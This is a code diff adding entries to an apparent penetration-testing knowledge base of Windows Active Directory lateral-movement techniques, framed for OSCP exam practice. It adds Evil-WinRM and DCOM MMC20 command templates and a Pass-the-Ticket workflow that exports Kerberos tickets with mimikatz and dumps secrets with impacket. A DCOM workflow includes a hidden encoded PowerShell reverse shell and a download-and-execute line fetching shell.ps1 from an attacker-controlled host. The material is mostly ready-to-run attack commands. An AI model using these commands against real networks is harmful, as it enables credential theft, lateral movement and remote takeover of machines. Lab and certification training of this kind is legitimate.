@@ -97,6 +97,32 @@ LATERAL_TECHNIQUES: Dict[str, List[TechniqueInfo]] = {
             disadvantages="Requires RPC, less reliable than PsExec/WMI",
             oscp_relevance="medium",
         ),
+        TechniqueInfo(
+            name="Evil-WinRM",
+            command_templates={
+                "password": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
+                "ntlm-hash": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
+                "kerberos-ticket": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
+            },
+            ports=[5985, 5986],
+            requirements=["WinRM port 5985/5986 open", "Local admin rights"],
+            noise_level="low",
+            advantages="Interactive PowerShell, file upload/download, stealthy, great for post-exploitation",
+            disadvantages="Requires WinRM enabled, may need firewall exception",
+            oscp_relevance="high",
+        ),
+        TechniqueInfo(
+            name="DCOM MMC20 (PowerShell)",
+            command_templates={
+                "password": "$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','<TARGET>')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')",
+            },
+            ports=[135],
+            requirements=["RPC port 135 open", "Must run FROM compromised Windows host", "Local admin on target"],
+            noise_level="low",
+            advantages="Fileless, native PowerShell, no tools needed, often bypasses detection",
+            disadvantages="Requires compromised Windows host to run from, no interactive shell",
+            oscp_relevance="high",
+        ),
     ],
     "CanPSRemote": [
         TechniqueInfo(
@@ -1382,6 +1408,146 @@ HARVEST_TIPS: Dict[str, Dict[str, List[str]]] = {
             "Access resources using hostname: dir \\\\DC01\\C$",
             "DO NOT use IP addresses (forces NTLM, bypasses ticket)",
             "Chain with other Kerberos attacks: Silver/Golden tickets",
+        ],
+    },
+}
+
+# Pass-the-Ticket workflow - step by step guide
+PTT_WORKFLOW: Dict[str, Dict[str, Any]] = {
+    "export": {
+        "title": "1. EXPORT TICKETS",
+        "command": 'mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"',
+        "notes": [
+            "Creates .kirbi files in current directory",
+            "Look for *krbtgt*.kirbi files (TGTs) - HIGHEST PRIORITY",
+            "TGT format: [session]-2-0-*-user@krbtgt-DOMAIN.kirbi",
+        ],
+    },
+    "identify": {
+        "title": "2. IDENTIFY VALUABLE TICKETS",
+        "priority_order": [
+            ("*krbtgt*.kirbi", "TGT - Can request ANY service ticket", "HIGHEST"),
+            ("*cifs*.kirbi", "File share access to specific host", "HIGH"),
+            ("*ldap*.kirbi", "LDAP access (enumeration)", "MEDIUM"),
+            ("*http*.kirbi", "Web service access", "LOW"),
+        ],
+        "notes": [
+            "User tickets (user@...) > Machine tickets (COMPUTER$@...)",
+            "DA/admin user TGTs = domain-wide access",
+        ],
+    },
+    "import_windows": {
+        "title": "3a. IMPORT TICKET (Windows)",
+        "commands": [
+            ("Import", 'mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"'),
+            ("Verify", "klist"),
+        ],
+        "success_indicators": [
+            "klist shows ticket for target user",
+            "Server: krbtgt/DOMAIN (for TGT)",
+        ],
+    },
+    "import_linux": {
+        "title": "3b. IMPORT TICKET (Kali)",
+        "commands": [
+            ("Convert", "impacket-ticketConverter <ticket.kirbi> ticket.ccache"),
+            ("Set env", "export KRB5CCNAME=$(pwd)/ticket.ccache"),
+            ("Verify", "klist"),
+        ],
+        "notes": [
+            "Must convert .kirbi (Windows) to .ccache (Linux)",
+            "Use absolute path for KRB5CCNAME",
+        ],
+    },
+    "capitalize": {
+        "title": "4. USE THE TICKET",
+        "critical_warning": "MUST use HOSTNAME not IP address!",
+        "windows_commands": [
+            ("List shares", "dir \\\\<TARGET>.domain.com\\C$"),
+            ("Get flag", "type \\\\<TARGET>.domain.com\\C$\\Users\\Administrator\\Desktop\\proof.txt"),
+            ("PsExec", "PsExec.exe \\\\<TARGET>.domain.com cmd.exe"),
+        ],
+        "linux_commands": [
+            ("SMB access", "impacket-smbclient -k -no-pass <TARGET>.domain.com"),
+            ("Shell", "impacket-psexec -k -no-pass <USER>@<TARGET>.domain.com"),
+            ("Dump secrets", "impacket-secretsdump -k -no-pass <USER>@<TARGET>.domain.com"),
+        ],
+        "examples": {
+            "correct": "dir \\\\DC01.corp.com\\C$  (Kerberos auth)",
+            "wrong": "dir \\\\192.168.1.1\\C$  (Falls back to NTLM!)",
+        },
+    },
+    "troubleshoot": {
+        "title": "5. TROUBLESHOOTING",
+        "issues": [
+            {
+                "problem": "klist shows no tickets after import",
+                "causes": ["Wrong session", "Ticket expired", "Syntax error (use :: not :)"],
+                "fix": "Re-export on target, check timestamp, verify path to .kirbi",
+            },
+            {
+                "problem": "Access denied with valid ticket",
+                "causes": ["Using IP instead of hostname", "Ticket for wrong service", "Expired"],
+                "fix": "Use FQDN hostname, check klist expiry, export fresh ticket",
+            },
+            {
+                "problem": "KDC_ERR_PREAUTH_REQUIRED",
+                "causes": ["Ticket not injected", "Wrong domain context"],
+                "fix": "Verify KRB5CCNAME path is absolute, domain matches ticket",
+            },
+        ],
+    },
+}
+
+# DCOM Lateral Movement workflow (PowerShell-based, from compromised Windows host)
+DCOM_WORKFLOW: Dict[str, Any] = {
+    "description": "Fileless lateral movement via MMC20.Application DCOM object",
+    "requirements": [
+        "Must execute FROM a compromised Windows host",
+        "Local admin on target machine",
+        "RPC port 135 open on target",
+    ],
+    "step1_instantiate": {
+        "title": "1. INSTANTIATE REMOTE DCOM OBJECT",
+        "command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','<TARGET_IP>'))",
+        "note": "Replace <TARGET_IP> with target machine IP",
+    },
+    "step2_execute": {
+        "title": "2. EXECUTE COMMAND",
+        "examples": [
+            {
+                "name": "Simple command",
+                "command": "$dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c whoami > C:\\temp\\out.txt','7')",
+            },
+            {
+                "name": "Reverse shell (PowerShell encoded)",
+                "setup": "# First generate payload on Kali:\npython3 -c \"import base64; print(base64.b64encode(open('shell.ps1','rb').read()).decode())\"",
+                "command": "$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'powershell -nop -w hidden -e <BASE64_PAYLOAD>','7')",
+            },
+            {
+                "name": "Download & execute",
+                "command": "$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'IEX(New-Object Net.WebClient).DownloadString(\"http://<KALI_IP>/shell.ps1\")','7')",
+            },
+        ],
+    },
+    "step3_verify": {
+        "title": "3. VERIFY EXECUTION",
+        "methods": [
+            "Check listener for reverse shell connection",
+            "RDP/WinRM to target and check output file",
+            "Use tasklist | findstr <process> on target",
+        ],
+    },
+    "troubleshooting": {
+        "issues": [
+            {
+                "problem": "Access denied / RPC server unavailable",
+                "fix": "Verify local admin rights, check port 135 is open, ensure DCOM is enabled",
+            },
+            {
+                "problem": "Command executes but no shell",
+                "fix": "Check firewall on target, use encoded payload, try different execution method",
+            },
         ],
     },
 }
